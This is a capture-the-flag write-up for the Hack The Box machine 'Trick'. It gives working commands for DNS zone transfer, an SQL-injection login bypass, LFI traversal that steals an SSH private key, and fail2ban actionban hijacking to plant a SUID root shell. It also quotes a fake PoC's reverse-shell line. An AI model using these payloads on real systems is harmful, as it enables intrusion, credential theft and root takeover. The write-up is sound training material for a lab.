
# Trick — HTB Writeup (Linux, full chain)

**Box:** Trick · **IP:** 10.129.227.180 · **Domain:** trick.htb
**Chain:** nmap → DNS zone transfer → vhost naming convention → SQLi login bypass → LFI (filter bypass) → steal SSH key → user `michael` → fail2ban config-write privesc → **root**

> The **"What I learned"** boxes are the real writeup — each is a question I actually hit and the answer.

---

## Phase 1 — Enumerate

```bash
nmap -p- --min-rate 5000 10.129.227.180
```
```bash
nmap -sCV -p 22,25,53,80 10.129.227.180
```

| Port | Service | Note |
|---|---|---|
| 22 | SSH | OpenSSH 7.9p1 (Debian 10) |
| 25 | SMTP | couldn't connect |
| **53** | **DNS** | **ISC BIND 9.11.5 — the box runs its own DNS** |
| 80 | HTTP | nginx 1.14.2 — "Coming Soon" theme (dead) |

Web dir fuzz only found the template junk (`assets`, `css`, `js`):
```bash
ffuf -u http://10.129.227.180/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fs 5480 -s -t 50
```

> **What I learned #1 — read EVERY open port as a question.** I tunnel-visioned on port 80. The loudest signal was **port 53: the box is a DNS server.** Each port asks "what do I enumerate for THIS service?" nginx 1.14.2 → nothing. Open box-owned DNS → enumerate DNS. That was the way in.

---

## Phase 2 — The fake-PoC trap (big lesson)

While stuck I ran a flashy repo: **"CVE-2026-42945 NGINX RIFT EXPLOIT."** Dramatic banner, brute-forced fake "libc/heap offsets," then "Exploit successful!" and a shell.

**100% fake / malicious:**
- The "shell" ran `...s.connect(("10.10.15.249",4444))...["/bin/sh","-i"]` — `10.10.15.249` is **my own IP**. It ran a reverse shell from my box back to my box (a **loopback**). nginx was never touched. `whoami` = my own user.
- A remote heap overflow can't spray libc offsets over HTTP and "guess right." Pure theatre.
- Future-dated CVE (2026) + ASCII banner = classic fake dressing.
- It ran **arbitrary code on MY box** under the banner of exploiting the target.

> **What I learned #2 — vet PoCs BEFORE running.** `python3 script.py -h`, then `cat` the source and look for `system(`, `connect(`, `subprocess` pointing at odd IPs. A "remote exploit" that connects to **your own IP** or brute-forces memory offsets over HTTP is fake/malicious. nginx 1.14.2 was a rabbit hole.

---

## Phase 3 — Pull the domain from the box's own DNS

```bash
dig @10.129.227.180 -x 10.129.227.180
```
Answer: `PTR trick.htb`.

> **What I learned #3 — `dig @server target`.** `@IP` = *which server to ask*; the rest = *what to ask*. `-x IP` = reverse lookup ("what name owns this IP?"). So this asks the box "you're a DNS server — what's your own name?" An open DNS server usually tells you the domain if you just ask. The two IPs match only because I'm asking the server about itself.

```bash
echo '10.129.227.180 trick.htb' | sudo tee -a /etc/hosts
```

---

## Phase 4 — Zone transfer → first vhost

```bash
dig axfr @10.129.227.180 trick.htb
```
AXFR dumped the zone, revealing **`preprod-payroll.trick.htb`**.
```bash
echo '10.129.227.180 preprod-payroll.trick.htb' | sudo tee -a /etc/hosts
```

> **What I learned #4 — AXFR.** A misconfigured DNS server hands over its whole zone file on request, including subdomains/vhosts a wordlist would never guess. Always try `dig axfr @IP domain` against an open DNS.

---

## Phase 5 — SQLi login bypass (payroll)

The login page's source (Burp capture) showed it POSTs via AJAX:
```js
url:'ajax.php?action=login', method:'POST', data:$(this).serialize()
```

> **What I learned #5 — attack the endpoint, not the pretty page.** The login page is just HTML+JS; the SQL runs in **`ajax.php`**. Use DevTools → Network to see where the form really POSTs. That URL is what you feed curl/sqlmap.

Auth bypass — this worked in the `username` field (password anything):
```
' or 1=1 -- -
```
Makes the query always-true and comments out the password check → logged in.

Dumping the DB via sqlmap was a **detour** — it dropped to slow **time-based blind** and `payroll_db` only holds app data:

```bash
sqlmap -r bb -p username --batch --dbs
```
> **What I learned #5b — time-based blind = yellow flag.** It extracts one char at a time (slow, flaky). Don't let a grinding sqlmap stop you exploring the faster path. The real foothold was another vhost, not the DB.

---

## Phase 6 — Vhost naming convention → the real vhost

Normal vhost fuzz (`FUZZ.trick.htb`) found nothing — the names follow a **`preprod-` convention**. Fuzz the *suffix*, keep the prefix fixed:
```bash
ffuf -u http://10.129.227.180/ -H "Host: preprod-FUZZ.trick.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 5480 -t 50
```
→ **`preprod-marketing.trick.htb`**.
```bash
echo '10.129.227.180 preprod-marketing.trick.htb' | sudo tee -a /etc/hosts
```

> **What I learned #6 — found one, the rest follow the pattern.** `preprod-payroll` told me the convention is `preprod-*`. Lock the fixed part, fuzz the variable part. (Same idea as `user1`→`user{N}`, `api/v1`→`api/v{N}`.) A plain wordlist has `marketing` but not `preprod-marketing`.

---

## Phase 7 — LFI → steal SSH key → user michael

`preprod-marketing` has `index.php?page=`. Plain traversal was **blank** (the app strips `../`), so I used the non-recursive bypass `....//`:
```
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//etc/passwd
```
`/etc/passwd` showed user **michael** (`/bin/bash`).

> **What I learned #7a — LFI reads FILES, it is not a terminal.** No `ls`/`pwd`/commands. You read **known conventional paths** (`/etc/passwd`, `~/.ssh/id_rsa`, `.bash_history`, source via `php://filter`). Blank output = `../` is being stripped → use `....//` (strips `../` once, leaves a valid `../`).

Grab the SSH key **with curl, not copy-paste** (keys are whitespace-sensitive):
```bash
curl -s 'http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//home/michael/.ssh/id_rsa' -o m
```
```bash
chmod 600 m
```
```bash
ssh -i m michael@10.129.227.180
```

> **What I learned #7b — curl for format-sensitive loot.** Copy-pasting a key from the browser mangles whitespace → `error in libcrypto`. `curl -o` saves the raw bytes. SSH refuses world-readable keys → `chmod 600`.

```bash
cat ~/user.txt
```

---

## Phase 8 — Privesc: fail2ban config-write → root

```bash
sudo -l
```
```
(root) NOPASSWD: /etc/init.d/fail2ban restart
```
```bash
id
```
```
groups=1001(michael),1002(security)
```

> **What I learned #8a — NOPASSWD covers ONE exact command.** The free pass is only for `/etc/init.d/fail2ban restart`. `sudo fail2ban-client ...` prompts for a password (not on the list) — so GTFOBins' fail2ban recipe (which needs `sudo fail2ban-client`) does NOT apply here. My lever is: **restart fail2ban as root** + **write its config via the `security` group**.

> **What I learned #8b — how to find this with zero prior knowledge.** `sudo -l` → Google **"fail2ban privilege escalation"** → HackTricks / juggernaut-sec explain the exact trick. The pattern to recognize: *I can make a root process run AND edit what it does* = privesc (same shape as cron/systemd/backup-script abuse).

**The mechanism:** fail2ban runs as root. When it **bans** an IP it runs the `actionban` command — as root. Hijack `actionban` to make a SUID-root copy of bash.

The config file is root-owned (can't edit in place → Permission denied), but `/etc/fail2ban/action.d/` is **group-writable by `security`**, so I can delete + recreate it (directory write controls create/delete, regardless of file owner):
```bash
cp /etc/fail2ban/action.d/iptables-multiport.conf /tmp/ip.conf
```
```bash
sed -i 's|^actionban =.*|actionban = cp /bin/bash /tmp/rootshell \&\& chmod 4755 /tmp/rootshell|' /tmp/ip.conf
```
```bash
rm -f /etc/fail2ban/action.d/iptables-multiport.conf
```
```bash
cp /tmp/ip.conf /etc/fail2ban/action.d/iptables-multiport.conf
```
```bash
grep actionban /etc/fail2ban/action.d/iptables-multiport.conf
```

Reload as root (the one command I'm allowed; also clears old bans):
```bash
sudo /etc/init.d/fail2ban restart
```

Trigger a ban — fail SSH repeatedly from the **attack box** (fast, back-to-back, ~5+ fails in the findtime window):
```bash
for i in $(seq 1 8); do ssh baduser@10.129.227.180; done
```

Back as michael, the ban fired `actionban` as root → SUID bash exists:
```bash
ls -la /tmp/rootshell
```
```
-rwsr-xr-x 1 root root ... /tmp/rootshell
```
```bash
/tmp/rootshell -p
```
```bash
id
```
```
uid=1001(michael) gid=1001(michael) euid=0(root)
```
→ **ROOT** (euid=0 is what SUID gives you).
```bash
cat /root/root.txt
```

> **What I learned #8c — SUID = run as the file's OWNER.** `chmod 4755`: the leading `4` = SUID bit, `755` = execute for everyone. Owner is root (root created it during the ban), so when michael runs it, it executes **as root**. Run it with `-p` so bash KEEPS the privileges (without `-p` it drops back to michael).
> **Gotcha I hit:** `chmod +s` only sets the SUID bit, not execute-for-others → `-rws--S---` → Permission denied. Use the numeric form `chmod 4755` (or `4777`) so "others" get `x`. One-shot, correct the first time.

---

## The full kill chain (one line)
nmap (port 53!) → `dig -x` for the domain → `dig axfr` → found `preprod-payroll` → SQLi `' or 1=1 -- -` on `ajax.php` → vhost convention → `preprod-marketing` → LFI with `....//` → curl the SSH key → `michael` → `sudo -l` fail2ban → write `actionban` (SUID bash) via `security` group → trigger ban → `/tmp/rootshell -p` → **root**.

## Takeaways
1. Read **every open port** as "what do I enumerate here?" — an open DNS server is a giant arrow.
2. **Vet PoCs** before running — `-h` then `cat`; one that connects to YOUR IP or brute-forces heap offsets over HTTP is fake/malicious.
3. Open 53 → `dig @IP -x IP` for the domain → `dig axfr @IP domain` for the zone.
4. Attack the **real endpoint** (`ajax.php`), not the HTML page — use DevTools Network.
5. Found one item with a naming pattern → **fuzz the variable part** for the rest.
6. **LFI reads files, not commands.** Blank = `../` stripped → `....//`. Grab keys with **curl**, not copy-paste.
7. `sudo -l` NOPASSWD = **one exact command**. Cross-reference it with **what files you can write** (group membership!).
8. **SUID = run as owner.** `chmod 4755` + `-p`. Control what a root process runs = privesc.
